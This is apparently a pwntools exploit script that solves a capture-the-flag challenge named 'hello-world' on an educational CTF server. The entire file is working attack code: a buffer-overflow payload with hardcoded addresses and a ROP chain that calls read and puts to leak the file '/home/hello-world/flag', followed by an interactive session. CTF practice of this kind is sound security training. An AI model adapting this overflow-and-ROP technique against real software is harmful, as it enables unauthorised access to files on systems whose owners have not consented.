#!/usr/bin/python3

from pwn import *
LOCAL = len(sys.argv) >= 2 and sys.argv[1] == 'local'


context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if LOCAL:
    r = process('./hello-world')
    gdb.attach(r, gdbscript='break puts')
else:
    r = remote('edu-ctf.zoolab.org', 30212)

e = ELF('./hello-world')
fini = 0x4011b6
buf = 0x402004

rop = ROP(e)
rop.rdi = 3
rop.rsi = 0x404140
rop.call(0x401090) # read@plt
rop.rdi = 0x404140
rop.rbp = 0x404140
rop.call(0x401080) # puts@plt
rop.call(0x4010d0) # _start
print(rop.dump())
r.send(b'\xff')
r.send(b'\xff' * 0x10 + b'/home/hello-world/flag' + b'\x00' * 2 + b'A' * 0x50 + rop.chain())
r.interactive()